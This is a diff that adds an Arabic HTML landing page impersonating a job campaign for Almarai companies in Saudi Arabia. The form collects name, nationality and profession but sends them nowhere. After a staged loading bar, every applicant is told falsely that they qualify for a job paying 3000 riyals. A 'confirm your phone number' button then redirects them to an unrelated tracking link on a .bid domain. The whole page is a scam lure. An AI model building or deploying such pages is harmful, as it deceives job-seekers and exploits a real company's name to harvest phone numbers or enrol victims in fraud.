@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <title>وظائف المراعي بالسعودية</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta name="theme-color" content="#059669" />
+  <style>
+    :root{ --brand:#059669; --brand-700:#047857; --bg:#f8fafc; --text:#0f172a; }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, 'Noto Kufi Arabic','Cairo','Tajawal', sans-serif;
+      color:var(--text); background: var(--bg) no-repeat center/cover fixed url('images/background.jpg');
+      -webkit-tap-highlight-color: transparent;
+    }
+    .wrap{min-height:100%; display:flex; flex-direction:column}
+    header, footer{ background:rgba(255,255,255,.85); backdrop-filter: blur(8px); border-block:1px solid rgba(15,23,42,.08); }
+    .container{max-width:980px; margin-inline:auto; padding:16px}
+    h1{margin:0; font-weight:800; letter-spacing:-.02em; font-size:clamp(22px,3.5vw,32px)}
+    .brand{color:var(--brand)}
+    main .grid{display:grid; gap:16px; grid-template-columns:1fr}
+    @media (min-width:880px){ main .grid{grid-template-columns:1fr 1fr; gap:32px} }
+    .card{ background:rgba(255,255,255,.94); backdrop-filter: blur(8px); border:1px solid rgba(15,23,42,.08); border-radius:18px; padding:clamp(16px,3vw,28px); box-shadow:0 6px 18px rgba(2,6,23,.06); }
+    label{font-size:14px; font-weight:700; display:block; margin-bottom:8px}
+    input[type=text]{
+      width:100%; border:1px solid #e5e7eb; border-radius:14px; padding:14px 16px; font-size:16px; outline:none;
+    }
+    input[type=text]:focus{border-color:var(--brand); box-shadow:0 0 0 3px rgba(5,150,105,.15)}
+    .error{color:#dc2626; font-size:12px; margin-top:6px}
+    .has-error{border-color:#dc2626 !important; box-shadow:0 0 0 2px rgba(220,38,38,.15)}
+    .btn{ display:inline-flex; align-items:center; justify-content:center; gap:8px; background:var(--brand); color:#fff; border:none; border-radius:16px; padding:12px 16px; font-size:16px; font-weight:800; width:100%; cursor:pointer; text-decoration:none; transition:transform .05s ease, background .2s ease; }
+    .btn:hover{background:var(--brand-700)} .btn:active{transform:scale(.99)}
+    .muted{color:#475569; font-size:12px}
+    ul.bullets{margin:16px 0 0; padding:0; list-style:none}
+    ul.bullets li{display:flex; gap:8px; align-items:flex-start; margin:10px 0; color:#334155}
+    .check{inline-size:20px; block-size:20px; color:var(--brand-700)}
+    .center{text-align:center}
+    .badge{inline-size:60px; block-size:60px; border-radius:999px; display:grid; place-items:center; background:#d1fae5; margin:0 auto 12px; color:var(--brand-700)}
+    footer .container{font-size:12px; color:#475569; display:flex; justify-content:space-between}
+    .hidden{display:none !important}
+    .btn-full{width:100%}
+
+    /* ===== Loading Overlay ===== */
+    .loader-overlay{
+      position: fixed; inset: 0; z-index: 1000;
+      background: rgba(255,255,255,.92);
+      backdrop-filter: blur(6px);
+      display: none; align-items: center; justify-content: center;
+      text-align: center; padding: 24px;
+    }
+    .loader-box{
+      background: #ffffff; border: 1px solid rgba(15,23,42,.08);
+      border-radius: 16px; padding: 20px 22px; min-width: 260px;
+      box-shadow: 0 10px 24px rgba(2,6,23,.08);
+    }
+    .spinner{
+      width: 44px; height: 44px; border-radius: 999px;
+      border: 4px solid #d1fae5; border-top-color: var(--brand);
+      animation: spin 1s linear infinite; margin: 0 auto 10px;
+    }
+    @keyframes spin{ to{ transform: rotate(360deg) } }
+    .loader-text{ font-weight:800; color:#065f46; margin: 0 0 6px; }
+    .progress{ width: 240px; height: 8px; background:#e2e8f0; border-radius: 999px; overflow: hidden; margin:10px auto 0; }
+    .bar{ width: 0%; height: 100%; background: var(--brand); }
+    @keyframes load { from{ width: 0% } to{ width: 100% } }
+  </style>
+</head>
+<body>
+  <div class="wrap" aria-busy="false">
+    <header>
+      <div class="container" style="display:flex; align-items:center; justify-content:space-between; gap:8px;">
+        <h1>وظائف <span class="brand">المراعي</span> بالسعودية</h1>
+        <div style="font-size:12px; color:#475569; display:none;">حملة توظيف — اختيارك لمستقبل أفضل</div>
+      </div>
+    </header>
+
+    <main>
+      <!-- شاشة التقديم -->
+      <section id="screen-form" class="container">
+        <div class="grid">
+          <div class="card">
+            <h2 style="margin:0 0 8px; font-size:20px">قدّم الآن</h2>
+            <p class="muted" style="text-align:right; margin:0 0 16px; font-size:14px">
+              املأ البيانات التالية بدقة ليتم التواصل معك من قِبل فريق التوظيف.
+            </p>
+
+            <form id="applyForm" novalidate>
+              <div style="margin-bottom:14px">
+                <label for="name">الاسم الكامل</label>
+                <input type="text" id="name" placeholder="مثال: أحمد محمد علي" inputmode="text" required minlength="2"/>
+                <div class="error hidden" id="nameErr">من فضلك أدخل اسمًا صحيحًا (على الأقل حرفان).</div>
+              </div>
+
+              <div style="margin-bottom:14px">
+                <label for="nationality">الجنسية</label>
+                <input type="text" id="nationality" placeholder="مثال: مصري / سوداني / يمني ..." inputmode="text" required minlength="2"/>
+                <div class="error hidden" id="natErr">من فضلك أدخل الجنسية.</div>
+              </div>
+
+              <div style="margin-bottom:14px">
+                <label for="job">المهنة</label>
+                <input type="text" id="job" placeholder="مثال: فني صيانة / سائق / مشرف إنتاج ..." inputmode="text" required minlength="2"/>
+                <div class="error hidden" id="jobErr">من فضلك أدخل المهنة.</div>
+              </div>
+
+              <button type="submit" class="btn">إرسال الطلب</button>
+              <p class="muted" style="margin-top:10px">لن تنتقل للصفحة التالية إلا بعد إدخال جميع البيانات المطلوبة.</p>
+            </form>
+          </div>
+
+          <aside class="card" style="display:flex; flex-direction:column; justify-content:space-between">
+            <div>
+              <h3 style="margin:0 0 12px; font-size:18px">عنوان الحملة</h3>
+              <p style="margin:0; font-size: clamp(22px, 3.2vw, 28px); font-weight:800; line-height:1.25">
+                فرص عمل مميزة مع <span class="brand">شركات المراعي</span> بالسعودية
+              </p>
+              <ul class="bullets">
+                <li><svg class="check" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> عقد رسمي وإقامة سارية</li>
+                <li><svg class="check" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> تأمين طبي وبدلات سكن ومواصلات</li>
+                <li><svg class="check" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="m5 13 4 4L19 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg> راتب يبدأ من 3000 ريال سعودي</li>
+              </ul>
+            </div>
+          </aside>
+        </div>
+      </section>
+
+      <!-- شاشة التهنئة -->
+      <section id="screen-congrats" class="container hidden" aria-hidden="true">
+        <div class="card center">
+          <div class="badge">
+            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          </div>
+          <h2 style="margin:0 0 8px; font-size: clamp(20px, 3vw, 26px); font-weight:800;">مبروك!</h2>
+          <p style="margin:0 0 10px; font-size:clamp(16px, 2.5vw, 18px)">
+            أنت الآن مؤهل لاستلام الوظيفة بـ <b>شركات المراعي السعودية</b>
+          </p>
+          <p style="margin:0 0 6px">براتب يبدأ من <b>3000 ريال سعودي</b></p>
+          <p style="margin:0 16px 16px">سيتواصل معك أحد ممثلي خدمة التوظيف خلال <b>24 ساعة</b> لتحديد موعد ومكان المقابلة.</p>
+
+          <button id="confirmBtn" class="btn btn-full" style="max-width:720px; margin-inline:auto">
+            <!-- phone icon -->
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-inline-start:4px">
+              <path d="M22 16.92V19a2 2 0 0 1-2.18 2A19.8 19.8 0 0 1 12 19a19.8 19.8 0 0 1-7.82 2A2 2 0 0 1 2 19v-2.08" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M16 11a4 4 0 1 0-8 0" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            تأكيد رقم هاتفك
+          </button>
+        </div>
+      </section>
+    </main>
+
+    <footer>
+      <div class="container">
+        <span>© <span id="year"></span> حملة التوظيف — شركات المراعي</span>
+        <span>خصوصيتك مهمة لنا</span>
+      </div>
+    </footer>
+  </div>
+
+  <!-- Loading overlay -->
+  <div class="loader-overlay" id="loader" role="status" aria-live="polite" aria-label="جارٍ التحميل">
+    <div class="loader-box">
+      <div class="spinner" aria-hidden="true"></div>
+      <div class="loader-text">جارٍ تجهيز طلبك…</div>
+      <div class="progress"><div class="bar" id="loaderBar"></div></div>
+    </div>
+  </div>
+
+  <script>
+    // Elements
+    const yearEl = document.getElementById('year');
+    const formScreen = document.getElementById('screen-form');
+    const congratsScreen = document.getElementById('screen-congrats');
+    const applyForm = document.getElementById('applyForm');
+    const confirmBtn = document.getElementById('confirmBtn');
+    const nameEl = document.getElementById('name');
+    const natEl = document.getElementById('nationality');
+    const jobEl = document.getElementById('job');
+    const nameErr = document.getElementById('nameErr');
+    const natErr = document.getElementById('natErr');
+    const jobErr = document.getElementById('jobErr');
+    const loader = document.getElementById('loader');
+    const loaderBar = document.getElementById('loaderBar');
+    const APP = document.querySelector('.wrap');
+
+    yearEl.textContent = new Date().getFullYear();
+    const PHONE_URL = 'https://vlpjqrx.bid/cl/7f42b8a2d1f6af8a';
+
+    function hasValue(v){ return (v || '').trim().length >= 2; }
+    function setError(input, errEl, show){
+      input.classList.toggle('has-error', show);
+      errEl.classList.toggle('hidden', !show);
+    }
+
+    // Validate on blur for UX
+    [nameEl, natEl, jobEl].forEach(el => {
+      el.addEventListener('blur', ()=>{
+        const ok = hasValue(el.value);
+        const err = el.id === 'name' ? nameErr : el.id === 'nationality' ? natErr : jobErr;
+        setError(el, err, !ok);
+      });
+    });
+
+    function startLoader(duration=1800){
+      // reset bar animation
+      loaderBar.style.animation = 'none';
+      void loaderBar.offsetWidth; // reflow to restart animation
+      loaderBar.style.animation = `load ${duration}ms ease-out forwards`;
+
+      loader.style.display = 'flex';
+      APP.setAttribute('aria-busy', 'true');
+      document.body.style.pointerEvents = 'none';
+
+      return new Promise(resolve => setTimeout(resolve, duration));
+    }
+    function stopLoader(){
+      loader.style.display = 'none';
+      APP.setAttribute('aria-busy', 'false');
+      document.body.style.pointerEvents = '';
+    }
+
+    applyForm.addEventListener('submit', async function(e){
+      e.preventDefault();
+      const v1 = hasValue(nameEl.value);
+      const v2 = hasValue(natEl.value);
+      const v3 = hasValue(jobEl.value);
+
+      setError(nameEl, nameErr, !v1);
+      setError(natEl, natErr, !v2);
+      setError(jobEl, jobErr, !v3);
+
+      if(!(v1 && v2 && v3)){
+        (!v1 ? nameEl : !v2 ? natEl : jobEl).focus();
+        return;
+      }
+
+      // Show loading overlay then switch screen
+      await startLoader(1800);
+      formScreen.classList.add('hidden');
+      congratsScreen.classList.remove('hidden');
+      congratsScreen.setAttribute('aria-hidden', 'false');
+      window.scrollTo({top:0, behavior:'smooth'});
+      stopLoader();
+    });
+
+    confirmBtn.addEventListener('click', function(){
+      window.location.href = PHONE_URL; // open in same tab
+    });
+  </script>
+</body>
+</html>
